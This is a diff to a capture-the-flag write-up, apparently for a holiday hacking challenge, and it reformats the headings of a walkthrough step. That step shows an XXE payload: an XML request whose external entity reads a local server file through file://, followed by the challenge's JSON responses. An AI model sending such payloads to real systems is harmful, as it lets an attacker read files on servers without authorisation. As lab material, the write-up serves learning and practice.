@@ -271,8 +271,7 @@ Accept-Encoding: gzip, deflate
 - Let's look at the image.
 - You must open the image in your browser with burp (Your cookies). If you don't, you will see "*We're sorry. Please contact a moderator.*" image.
 - The picture tells us the name of the folder (*x_phial_pholder_2022*) and the two files that belong to it (*bluering.txt*, *redring.txt*). Let's open them.
-- bluering.txt:
-    - Request:
+- bluering.txt (Request):
 ```xml
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt"> ]>
@@ -282,8 +281,7 @@ Accept-Encoding: gzip, deflate
   <reqType>xml</reqType>
 </root>
 ```
-```
-    - Response:
+- bluering.txt (Response):
 ```json
 {
   "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
@@ -291,10 +289,7 @@ Accept-Encoding: gzip, deflate
   "visit": "none"
 }
 ```
-
-    - redring.txt:
-        - Response:
-
+- redring.txt (Response):
 ```json
 {
   "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
